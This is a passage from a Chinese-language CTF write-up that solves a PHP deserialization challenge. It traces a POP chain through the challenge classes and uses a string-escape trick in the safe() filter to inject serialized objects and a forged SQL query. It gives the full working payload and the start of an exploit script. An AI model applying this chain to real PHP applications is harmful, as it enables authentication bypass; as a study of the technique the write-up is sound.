data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;html></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;meta charset=\"utf-8\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;title>update&lt;/title></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&lt;h2>这是一个未完成的页面，上线时建议删除本页面&lt;/h2></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>&lt;/html>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你还没有登陆呢！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-></span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>大致浏览一下源码，很明显可以知道唯一获得 flag 的方式在 <code>update.php</code>  中的 <code>echo $flag;</code> ，要想进入语句，就要使 <code>$_SESSION['login']===1</code>  成立，而这一语句成立的位置为 <code>User</code>  类的 <code>login</code>  方法，对  <code>$_SESSION['login']</code>  进行赋值，但在进行该语句前，又会进入 <code>dbCtrl</code>  类的 <code>login</code>  方法中，查看此处 <code>login</code>  的逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">mysqli</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>由于一开始未成功登陆，第一个 if 必然不通过，因此若想要返回 id 值从而对 <code>$_SESSION['login']</code>  赋值，那么要通过第三个判断（第二个判断只要 sql 语句执行成功就可），也就是要使得输入的 <code>password</code>  与 sql 查出来的 <code>password</code>  相同，由于预设的 sql 语句为 <code>select id,password from user where username=?</code> , 不妨将 id、password 分别改为 1 和 1 对应的 md5 值，从而查出来的 <code>password</code>  的 md5 值可控。满足该判断条件，之后将执行 <code>$_SESSION['token']=$this-&gt;name;</code>  可使得在下一次进入该函数时直接通过第一个判断。至此，得到两种方法，第一种调用 <code>User</code>  类的 <code>login</code>  方法，其中对 <code>dbCtrl</code>  类的 <code>login</code>  进行控制；第二种调用 <code>dbCtrl</code>  的 <code>login</code>  方法。但由于在调用 <code>User</code>  类的 <code>login</code>  方法时无法对 <code>dbCtrl</code>  直接进行操作，故这里采用第二种方法。</p>\n<p>要想进行如上操作， <code>User</code>  类的 <code>login</code>  方法执行路口，也即要找到反序列化入口。观察源码，可知 <code>User</code>  类中的 <code>update</code>  方法中有语句 <code>$Info=unserialize($this-&gt;getNewinfo());</code> , 再结合 <code>update.php</code>  中的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-></span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可知， <code>User</code>  类中的 <code>update</code>  方法可以执行，再看其反序列化对象 <code>$this-&gt;getNewinfo()</code> ，由 <code>safe(serialize(new Info($age,$nickname)))</code>  得到而 age，nickname 分别由 post 上传得到，可控，反序列化入口找到。而恰好 <code>update.php</code>  会执行 <code>User</code>  的 <code>update</code>  方法</p>\n<p>现在首先先不看 <code>safe</code>  方法，我们需要通过 <code>Info</code>  类来执行 <code>User</code>  类中的 <code>login</code>  方法，观察 <code>Info</code>  类，可看到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>恰好执行了 login 方法，那么我们所需要做的是反序列化时使得 CtrlCase 对应的一个对象从而调用 User 类的 login 方法或直接为 User 类，而要调用此__call 魔术方法，需要使用 Info 类调用不存在的方法，也就是说我们需要找到一个位置调用 Info 类的一个方法，再回到源码，可以发现 User 类中和 UpdateHelper 类中分别有方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span><span class=\"token operator\">-></span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//UpdateHelper</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这样我们可以通过 <code>UpdateHelper</code>  类的 <code>__destruct</code>  方法来调用 <code>User</code>  类的 <code>__toString</code>  方法，如果此时 <code>nickname</code>  值为 <code>Info</code>  类对象，这里调用了 <code>Info</code>  类中的 <code>update</code>  方法，但由于 <code>Info</code>  类中没有此方法，便调用了 <code>__call</code>  方法，实现了之前的目的。</p>\n<p>至此，对于方法的调用结束，这时需要想办法进行序列化操作，通过反序列化得到一个满足条件的 <code>Info</code>  类</p>\n<p><code>Info</code>  类中， <code>CtrlCase</code>  为一个 <code>UpdateHelper</code>  对象，摧毁时，自自动执行 <code>echo $this-&gt;sql;</code> , 而 <code>sql</code>  对应一个一个 <code>User</code>  对象，自动调用 <code>nickname</code>  的 <code>update</code>  方法，此时 <code>nickname</code>  为一个 <code>Info</code>  对象，无  <code>update</code>  方法，调用 <code>__call</code>  方法，之后执行 <code>echo $this-&gt;CtrlCase-&gt;login($argument[0]);</code> , 而此时 <code>CtrlCase</code>  为一个 <code>dbCtrl</code>  对象，调用其 <code>login</code>  方法， <code>sql</code>  语句为前一个 <code>User</code>  的 <code>age</code> ，即 <code>age</code>  赋值为 <code>SELECT 1,\\&quot;c4ca4238a0b923820dcc509a6f75849b\\&quot;from user where username=?</code> , 所以进行该语句，通过所有函数， <code>$_SESSION['token']=$this-&gt;name</code>  执行，下一次再进入时，可直接登陆成功</p>\n<p>这里看 <code>Info</code>  类的 <code>__construct</code>  方法，只对 <code>age</code>  和 <code>nickname</code>  进行赋值，根据上面的分析，必须要有 <code>CtrlCase</code>  变量的赋值，所以这里采用手动添加，值为一个 <code>UpdateHelper</code>  的序列化字符串，即为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>\\<span class=\"token string double-quoted-string\">\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$updateHelper</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>要想成功反序列化，即让添加的 <code>CtrlCase</code>  成功反序列化，我们需要反序列化逃逸，所幸在进行反序列化操作前，用 <code>safe</code>  函数对字符串进行了过滤，会将符合条件的字符串修改为 <code>hacker</code> ，为字符串逃逸提供条件，这里为了减少序列化字符串量，使用 <code>into</code>  转换，一次多两个字符</p>\n<p>这里先给出序列化类</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sql 查询语句，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 密码，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$in</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$in</span><span class=\"token operator\">-></span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 类内的 Info 对象的 CtrlCase 为一个 dbCrtl 对象</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$in</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//nickname 为一个 Info 类对象</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$updateHelper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$updateHelper</span><span class=\"token operator\">-></span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//UpdateHelper 对象的 sql 为一个 User 对象</span></pre></td></tr></table></figure><p>由于 <code>Info</code>  类序列化结果为 <code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;xx&quot;;s:8:&quot;nickname&quot;;s:3:&quot;xxx&quot;</code>  的格式，这里为了让后面添加成功，不妨先用 <code>&quot;</code>  提前闭合 nickname 的值，之后添加 <code>;s:8:\\&quot;CtrlCase\\&quot;;&quot; . serialize($updateHelper). &quot;&#125;&quot;;</code>  (加  <code>&#125; </code> 是为了闭合第一个 <code>&#123; </code> ，使反序列化成功， <code>echo</code>  后，加上添加的 <code>&quot;</code>  、 <code>&#125;</code>  总共为 302 个字符，所有有一个 into 换一个 hacker 多两个字符算，总共有 151 个 <code>into</code> ，故 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>age&#x3D;18&amp;nickname&#x3D;intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:69:&quot;SELECT 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot;from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</pre></td></tr></table></figure><p>脚本为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 16:12:08</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-21 16:28:22</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td 